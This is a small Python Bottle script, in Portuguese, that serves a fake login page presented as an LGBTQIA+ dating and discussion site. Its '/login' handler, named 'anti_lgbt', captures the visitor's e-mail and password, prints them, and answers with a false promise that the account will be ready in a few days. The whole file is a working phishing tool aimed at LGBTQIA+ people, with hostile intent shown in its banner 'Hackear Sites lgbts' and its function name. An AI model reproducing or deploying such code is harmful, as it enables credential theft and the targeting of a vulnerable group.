from bottle import Bottle, request, run

Site = Bottle()

print("Hackear Sites lgbts\n")
@Site.route('/')
def site():
    return '''
    <html>
        <head><title>Login</title></head>
        <body>
            <form action="/login" method="POST">
            <center>
                <h2>Login</h2>
                <img src="C:/Users/hacke/Downloads/lgbtqiu.png" alt="Logo">
                <p> olá, esse é um site de LGBTQIA, esse site é para gyas, lesbiscas etc. </p>
                <p> para se relacionarem e baterem ideias e discutir assuntos </p>
                <p></p>
                <input type="text" name="email" placeholder="E-mail" required><br>
                <input type="password" name="senha" placeholder="Senha" required><br>
                <button type="submit">Entrar</button>
            </form>
            </center>
        </body>
    </html>
    '''
    
@Site.route('/login', method="POST")
def anti_lgbt():
    email = request.forms.get("email")
    senha = request.forms.get("senha")
    print(f"E-mail: {email}")
    print(f"Senha: {senha}")        
    return "Parabens! vai demorar alguns dias para ser feito, mas não se preocupa, nós avisaremos !"

if __name__ == '__main__':
    run(Site, host="localhost", port=8080, debug=True)